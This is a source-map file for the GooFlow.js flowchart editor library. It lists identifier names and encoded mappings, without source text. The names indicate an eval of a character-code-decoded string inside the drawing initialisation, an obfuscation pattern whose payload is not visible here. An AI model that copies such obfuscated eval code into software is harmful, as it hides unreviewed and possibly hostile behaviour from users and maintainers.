{"version":3,"sources":["GooFlow.js"],"names":["global","factory","define","amd","module","exports","require","GooFlow","$","window","this","_elCsys","dom","t","offsetTop","l","offsetLeft","offsetParent","top","left","_mouseP","ev","event","pageX","pageY","x","y","clientX","document","documentElement","scrollLeft","body","clientLeft","clientY","scrollTop","clientTop","calcPolyPoints","n1","n2","type","M","scale","N1","width","height","N2","sp","ep","SP","EP","m1","m2","start","end","calcStartEnd","X_1","Y_1","X_2","Y_2","x11","x12","x21","x22","y11","y12","y21","y22","getMValue","mType","selector","property","console","log","navigator","userAgent","indexOf","prototype","useSVG","$bgDiv","addClass","$id","attr","Date","getTime","colors","extend","color","css","font","main","append","$tool","$head","$title","$nowType","$lineData","$lineCount","$nodeData","$nodeCount","$areaData","$areaCount","$lineDom","$nodeDom","$areaDom","$max","initNum","$focus","$editable","$deletedItem","$workExtendStep","$scale","headHeight","tmp","haveHead","headLabel","initLabelText","headBtns","length","useOperStack","remarks","find","parent","onBtnNewClick","onBtnOpenClick","onBtnSaveClick","onFreshClick","onPrintClick","$headBtnEvents","headBtnEvents","on","inthis","e","tar","target","tagName","childNodes","This","data","Class","undo","redo","toolWidth","haveTool","titleCursor","toolBtns","titleDirect","titleDashed","haveDashed","i","tmpType","split","haveGroup","titleGroup","parentNode","switchToolBtn","$workArea","unselectable","onselectstart","onselect","children","X","Y","addNode","name","n","prop","$lineOper","focusItem","blurItem","$draw","_initDraw","$group","_initGroup","_initWorkForNode","onItemFocus","onItemBlur","onItemMark","onItemDbClick","onItemRightClick","onItemAdd","onItemDel","onItemMove","onItemRename","onItemResize","onLineMove","onLineSetType","onLinePointMove","_initExpendFunc","$ghost","_initEditFunc","_getSvgMarker","id","m","createElementNS","setAttribute","path","appendChild","prepend","defs","line","mark","createElement","coordsize","insertBefore","style","eval","c","r","z","String","fromCharCode","tmpClk","returnValue","preventDefault","oldTxt","from","to","textContent","getAttribute","innerHTML","parseInt","$textArea","val","display","focus","one","button","setName","removeData","hide","cursor","vX","vY","isMove","onmousemove","onmouseup","empty","resizeArea","outerWidth","outerHeight","moveArea","p","mouseup","delArea","setAreaColor","addArea","removeClass","tmpDbClickFunc","parents","Dom","clone","prependTo","moveNode","getElementById","node","drawLine","$mpTo","lineStart","lineEnd","dash","addLine","moveLinePoints","marked","delNode","cancelBubble","stopPropagation","resizeNode","titleExendRight","extendRight","titleExendBottom","extendBottom","w","h","parentDiv","scrollWidth","scrollHeight","_initLinePointsChg","$mpFrom","ps","pe","mousemove","points","value","removeChild","$lineMove","background-color","position","setLineM","delLine","setLineType","$undoStack","$redoStack","$isUndo","_checkStack","pushOper","funcName","paras","push","shift","splice","pushExternalOper","func","jsonPara","pop","keydown","keyCode","bindHeadBtnEvent","funcs","setNodeRemarks","remark","each","title","setHeadToolsRemarks","setExtWorkRemarks","k","key","getItemInfo","jq","strokeColor","bool","tid","_node2Area","nodeId","lane","area","areaId","json","mix","border-color","mixFont","ua","toLowerCase","alt","resetLines","oldName","text","para","Min","offsetWidth","trigger","remove","setTitle","_suitSize","maxW","maxH","k1","k2","k3","loadData","nodes","j","lines","areas","max","loadDataAjax","ajax","url","dataType","success","msg","error","XMLHttpRequest","textStatus","errorThrown","exportData","ret","JSON","parse","stringify","exportAlter","deletedItem","transNewId","oldId","newId","clearData","destrory","hi","lineFont","fontSize","strokeWeight","stroke","EndArrow","dashStyle","fillColor","drawPoly","poly","strPath","filled","addLineDom","lineData","res","offsetHeight","other","newType","noStack","lineId","newStart","newEnd","markItem","_areaFixNodes","reinitSize","hack","resetScale","factor","W","H","P","isWebkit","newSize","font-size","mW","mH","ifs","next","line-height","undefined","init","setColors","createGooFlow"],"mappings":"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G,GAAG,GAAG,GAAG,IAAI,IAAI,GAAG,GAAG,GAAG,GAAG,GAAG,GAAG,GAAG,IAAI,IAAI,IAAI,GAAG,GAAG,GAAG,IAAI,GAAG,IAAI,GAAG,GAAG,GAAG,IAAI,GAAG,GAAG,GACvG,IAAI,GAAG,GAAG,GAAG,GAAG,GAAG,IAAI,IAAI,IAAI,GAAG,GAAG,GAAG,IAAI,GAAG,IAAI,GAAG,GAAG,GAAG,IAAI,GAAG,GAAG,GAAG,GAAG,GAAG,GAAG,GAAG,GAAG,GAAG,IAAI,GAAG,IAAI,GACtG,GAAG,IAAI,IAAI,IAAI,IAAI,IAAI,GAAG,GAAG,GAAG,GAAG,IAAI,IAAI,IAAI,IAAI,IAAI,IAAI,IAAI,GAAG,GAAG,IAAI,IAAI,GAAG,IAAI,IAAI,GAAG,GAAG,GAAG,IAAI,IACrG,IAAI,IAAI,IAAI,IAAI,IAAI,GAAG,IAAI,IAAI,IAAI,GAAG,IAAI,IAAI,GAAG,GAAG,IAAI,IAAI,GAAG,IAAI,GAAG,GAAG,IAAI,IAAI,IAAI,GAAG,GAAG,IAAI,GAAG,IAAI,IACtG,IAAI,IAAI,GAAG,GAAG,GAAG,GAAG,GAAG,IAAI,IAAI,GAAG,IAAI,IAAI,IAAI,IAAI,GAAG,IAAI,IAAI,GAAG,GAAG,IAAI,IAAI,IAAI,GAAG,IAAI,IAAI,IAAI,GAAG,IAAI,IACrG,IAAI,IAAI,GAAG,IAAI,GAAG,IAAI,GAAG,IAAI,IAAI,IAAI,GAAG,IAAI,GAAG,GAAG,GAAG,IAAI,IAAI,GAAG,GAAG,IAAI,IAAI,IAAI,GAAG,GAAG,IAAI,IAAI,IAAI,GAAG,GAAG,IACvG,IAAI,IAAI,GAAG,IAAI,IAAI,IAAI,GAAG,GAAG,IAAI,IAAI,IAAI,IAAI,IAAI,IAAI,IAAI,IAAI,GAAG,GAAG,GAAG,GAAG,IAAI,GAAG,GAAG,IAAI,IAAI,GAAG,IAAI,IAAI,IACtG,IAAI,GAAG,GAAG,IAAI,GAAG,IAAI,GAAG,GAAG,IAAI,IAAI,GAAG,GAAG,IAAI,IAAI,GAAG,IAAI,GAAG,GAAG,GAAG,IAAI,GAAG,GAAG,GAAG,IAAI,IAAI,IAAI,IAAI,IAAI,IAAI,IACtG,IAAI,IAAI,GAAG,GAAG,GAAG,GAAG,IAAI,GAAG,GAAG,IAAI,IAAI,GAAG,IAAI,IAAI,GAAG,GAAG,GAAG,IAAI,IAAI,GAAG,GAAG,MACtErM,KAAK+J,OAER,IAAI0C,OAAO,KACwBA,OAAL,KAA3B5M,QAAQqE,UAAUC,OAAqB,IAC7B,WAEbrE,EAAEE,KAAK+J,OAAOxC,GAAG,QAAQkF,QAAQjF,OAAOxH,MAAM,SAASyH,GACtDA,EAAEM,KAAKP,OAAOqC,UAAU7J,KAAKqL,IAAG,KAE7BrL,KAAKiG,YAGTnG,EAAEE,KAAK+J,OAAOxC,GAAG,cAAckF,QAAQjF,OAAOxH,MAAM,SAASyH,GAC5D,IAAIK,EAAKL,EAAEM,KAAKP,OAChB,GAAkC,mBAAxBM,EAAK0C,mBAAyE,IAAxC1C,EAAK0C,iBAAiBxK,KAAKqL,GAAG,QAE7E,OADAtL,OAAOa,MAAOb,OAAOa,MAAM8L,aAAY,EAAQjF,EAAEkF,kBAC1C,IAGT7M,EAAEE,KAAK+J,OAAOxC,GAAG,WAAWkF,QAAQjF,OAAOxH,MAAM,SAASyH,GACzD,IAAIK,EAAKL,EAAEM,KAAKP,OAChB,GAA+B,mBAArBM,EAAKyC,gBAAmE,IAArCzC,EAAKyC,cAAcvK,KAAKqL,GAAG,QAAxE,CACA,IAAIuB,EAAO7L,EAAEC,EAAE6L,EAAKC,EACpB,GAA8B,KAA3BjN,QAAQqE,UAAUC,OACpByI,EAAO5M,KAAK6H,WAAW,GAAGkF,YAC1BF,EAAK7M,KAAKgN,aAAa,QAAQpE,MAAM,KACrCkE,EAAG9M,KAAKgN,aAAa,MAAMpE,MAAM,SAC7B,CACJgE,EAAO5M,KAAK6H,WAAW,GAAGoF,UAC1B,IAAIvD,EAAE1J,KAAKgN,aAAa,UAAUpE,MAAM,KACxCiE,GAAMnD,EAAE,GAAGA,EAAE,IACboD,GAAIpD,EAAE,GAAGA,EAAE,IAEsB,OAA/B5B,EAAKzC,UAAUrF,KAAKqL,IAAIxJ,MAC1BgL,EAAK,GAAG/E,EAAKzC,UAAUrF,KAAKqL,IAAIvJ,EAAEgG,EAAK1B,OACvC0G,EAAG,GAAGD,EAAK,IAE2B,OAA/B/E,EAAKzC,UAAUrF,KAAKqL,IAAIxJ,OAC/BgL,EAAK,GAAG/E,EAAKzC,UAAUrF,KAAKqL,IAAIvJ,EAAEgG,EAAK1B,OACvC0G,EAAG,GAAGD,EAAK,IAEZ9L,GAAGmM,SAASL,EAAK,GAAG,IAAIK,SAASJ,EAAG,GAAG,KAAK,EAAE,GAC9C9L,GAAGkM,SAASL,EAAK,GAAG,IAAIK,SAASJ,EA